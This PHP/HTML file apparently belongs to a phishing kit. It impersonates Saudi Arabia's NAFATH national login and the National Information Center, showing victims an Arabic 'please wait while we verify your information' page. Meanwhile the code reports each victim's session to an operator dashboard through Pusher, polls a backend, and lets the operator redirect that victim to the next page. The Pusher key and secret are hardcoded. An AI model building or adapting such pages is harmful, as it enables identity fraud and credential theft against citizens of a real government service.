<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'إنتظار نفاذ');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'إنتظار نفاذ'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}

?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head id="j_idt2">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width:device-width,initial-scale=1.0">


    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous">
    <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;500&display=swap" rel="stylesheet">
    <title>NAFATH</title>

    <style>
        .lds-default {
            display: inline-block;
            position: relative;
            width: 7%;
            height: 80px;
            right: 10%;

        }

        .lds-default div {
            position: absolute;
            width: 6px;
            height: 6px;
            background: black;
            border-radius: 50%;
            animation: lds-default 1.2s linear infinite;
        }

        .lds-default div:nth-child(1) {
            animation-delay: 0s;
            top: 37px;
            left: 66px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(2) {
            animation-delay: -0.1s;
            top: 22px;
            left: 62px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(3) {
            animation-delay: -0.2s;
            top: 11px;
            left: 52px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(4) {
            animation-delay: -0.3s;
            top: 7px;
            left: 37px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(5) {
            animation-delay: -0.4s;
            top: 11px;
            left: 22px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(6) {
            animation-delay: -0.5s;
            top: 22px;
            left: 11px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(7) {
            animation-delay: -0.6s;
            top: 37px;
            left: 7px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(8) {
            animation-delay: -0.7s;
            top: 52px;
            left: 11px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(9) {
            animation-delay: -0.8s;
            top: 62px;
            left: 22px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(10) {
            animation-delay: -0.9s;
            top: 66px;
            left: 37px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(11) {
            animation-delay: -1s;
            top: 62px;
            left: 52px;
            background-color: #28a745;
        }

        .lds-default div:nth-child(12) {
            animation-delay: -1.1s;
            top: 52px;
            left: 62px;
            background-color: #28a745;
        }

        @keyframes lds-default {

            0%,
            20%,
            80%,
            100% {
                transform: scale(1);
            }

            50% {
                transform: scale(1.5);
            }
        }

        nav {
            overflow: auto;
        }

        .nafad {
            margin-right: 222px;
            float: right;
        }

        .ff ul {
            list-style-type: none;
        }

        .ff ul li {
            display: inline;
            padding: 10px;
            font-weight: bold;
        }
    </style>
</head>

<body class="bg-light" style="font-family:'Tajawal', sans-serif; overflow-x: hidden;">

    <nav class="text-end shadow-sm px-3">
        <img src="./assets/nafad.png" class="my-4" />
    </nav>

    <div class="container" style="margin-bottom: 150px;">
        <div class="row d-flex justify-content-center">
            <div class="col-10 p-4 " style="border-radius: 15px;">
                <div class="container" style="position:relative ; text-align:center;margin-top:100px">
                    <div class="lds-default">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                    <h6 class="mt-3 fw-bold" style="color:#28a745;">الرجاء الإنتظار سيتم التأكد من المعلومات لا تخرج من هذه الصفحة حتى يتم التأكد</h6>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <div class="container rounded " style="background-color: #dddddd; overflow: hidden; ">
            <div class="row d-flex align-items-center pt-3 ">
                <div class="col-sm-3 col-lg-3 mt-4 ">
                    <p class="fw-bold text-end ">تطوير وتشغيل</p>
                    <h2 class="fw-bold text-end ">مركز المعلومات الوطني</h2>
                    <p class="fw-bold text-end ">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022</p>
                </div>
                <div class="col-sm-3 col-lg-3 text-center ">
                    <img src="./assets/NIC.png ">
                </div>
            </div>
        </div>
    </footer>
<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
    <script
        src="https://code.jquery.com/jquery-3.6.0.js"
        integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
        crossorigin="anonymous"></script>
    <script>
        setInterval(() => {
            $.ajax({
                url: "wait-fn-nafath.php",
                type: "POST",
                success: (response) => {
                    const data = JSON.parse(response);
                    if (data.CheckTheInfo_Nafad == 1) {
                        window.location = data.url;
                    } else if (data.CheckTheInfo_Nafad == 2) {
                        window.location = data.url;
                    }
                }
            });
        }, 1000);
    </script>

</body>

</html>